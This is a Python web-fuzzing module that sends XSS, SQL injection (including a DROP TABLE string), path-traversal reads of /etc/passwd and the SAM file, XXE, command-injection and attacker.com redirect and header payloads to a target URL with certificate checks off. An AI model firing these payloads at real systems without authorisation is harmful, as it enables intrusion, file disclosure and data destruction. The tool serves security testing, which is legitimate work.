#!/usr/bin/env python3
"""
Fuzzing Module - Fuzz parameters, headers, and payloads
"""

import requests
from colorama import Fore, init
import random
import string

init(autoreset=True)

class Fuzzer:
    """Simple fuzzing module"""
    
    # Fuzzing payloads
    PAYLOADS = {
        'xss': [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '\\"><script>alert(1)</script>'
        ],
        'sqli': [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL --",
            "admin' --",
            "' OR 1=1 --"
        ],
        'lfi': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'file:///etc/passwd',
            '/etc/passwd',
            '....//....//....//etc/passwd'
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>'
        ],
        'command_injection': [
            '; ls',
            '| cat /etc/passwd',
            '`whoami`',
            '$(whoami)',
            '; id;'
        ],
        'open_redirect': [
            'http://attacker.com',
            'https://attacker.com',
            '//attacker.com',
            '/attacker.com',
            'javascript:alert(1)'
        ]
    }
    
    def __init__(self, target):
        self.target = target
        self.results = []
    
    def fuzz_parameters(self, params_list, payload_type='xss'):
        """Fuzz parameters with payloads"""
        print(Fore.CYAN + f"[FUZZING] Fuzzing parameters with {payload_type} payloads")
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        session.verify = False
        
        payloads = self.PAYLOADS.get(payload_type, [])
        
        for param in params_list[:10]:  # Limit to 10 parameters
            for payload in payloads:
                try:
                    # Test as GET parameter
                    params = {param: payload}
                    response = session.get(self.target, params=params, timeout=5)
                    
                    # Check if payload reflected in response
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        print(Fore.RED + f"[FUZZ VULN] {param} reflected payload: {payload[:50]}")
                        self.results.append({
                            'type': payload_type,
                            'param': param,
                            'payload': payload,
                            'status': response.status_code
                        })
                    
                    # Test as POST parameter
                    data = {param: payload}
                    response = session.post(self.target, data=data, timeout=5)
                    
                    if payload in response.text:
                        print(Fore.RED + f"[FUZZ VULN] {param} (POST) reflected: {payload[:50]}")
                        self.results.append({
                            'type': payload_type,
                            'param': param,
                            'method': 'POST',
                            'payload': payload,
                            'status': response.status_code
                        })
                
                except Exception as e:
                    pass
    
    def fuzz_headers(self):
        """Fuzz HTTP headers"""
        print(Fore.CYAN + "[FUZZING] Fuzzing HTTP headers")
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        session = requests.Session()
        session.verify = False
        
        # Test headers for injection
        test_headers = {
            'X-Original-URL': 'http://attacker.com',
            'X-Rewrite-URL': 'http://attacker.com',
            'X-Forwarded-For': '127.0.0.1',
            'X-Forwarded-Host': 'attacker.com',
            'Host': 'attacker.com',
            'Referer': '"><script>alert(1)</script>'
        }
        
        for header_name, header_value in test_headers.items():
            try:
                headers = {header_name: header_value}
                response = session.get(self.target, headers=headers, timeout=5)
                
                print(Fore.BLUE + f"[FUZZ] {header_name}: {response.status_code}")
                
                self.results.append({
                    'type': 'header_injection',
                    'header': header_name,
                    'value': header_value,
                    'status': response.status_code
                })
            
            except Exception as e:
                pass
    
    def random_fuzzing(self, num_requests=50):
        """Send random fuzzing requests"""
        print(Fore.CYAN + f"[FUZZING] Sending {num_requests} random requests")
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        session.verify = False
        
        status_codes = {}
        
        for i in range(num_requests):
            try:
                # Generate random parameter names and values
                param_name = ''.join(random.choices(string.ascii_letters, k=8))
                param_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
                
                params = {param_name: param_value}
                response = session.get(self.target, params=params, timeout=3)
                
                status_code = response.status_code
                status_codes[status_code] = status_codes.get(status_code, 0) + 1
                
                if status_code not in [200, 404]:
                    print(Fore.YELLOW + f"[FUZZ] Interesting response: {status_code}")
                
                if i % 10 == 0:
                    print(Fore.BLUE + f"[FUZZING] {i}/{num_requests}")
            
            except Exception as e:
                pass
        
        print(Fore.BLUE + "[FUZZING] Status code distribution:")
        for status, count in sorted(status_codes.items()):
            print(Fore.BLUE + f"  {status}: {count}")
    
    def get_results(self):
        """Get fuzzing results"""
        return self.results
    
    def print_results(self):
        """Print fuzzing results"""
        print(Fore.MAGENTA + f"\n[FUZZING RESULTS] ({len(self.results)} findings)")
        
        for result in self.results:
            if result.get('param'):
                print(Fore.RED + f"  {result['type']}: {result['param']}")

def fuzz_target(target, fuzz_type='xss', parameters=None):
    """
    Fuzz a target with payloads
    """
    print(Fore.CYAN + "[FUZZING STARTED]")
    
    fuzzer = Fuzzer(target)
    
    if fuzz_type == 'all':
        for payload_type in ['xss', 'sqli', 'lfi', 'xxe', 'command_injection']:
            fuzzer.fuzz_parameters(parameters or ['id', 'name', 'q', 'search'], payload_type)
        fuzzer.fuzz_headers()
    elif fuzz_type == 'random':
        fuzzer.random_fuzzing()
    else:
        fuzzer.fuzz_parameters(parameters or ['id', 'name', 'q', 'search'], fuzz_type)
    
    fuzzer.print_results()
    
    print(Fore.CYAN + "[FUZZING COMPLETED]")
    return fuzzer.get_results()
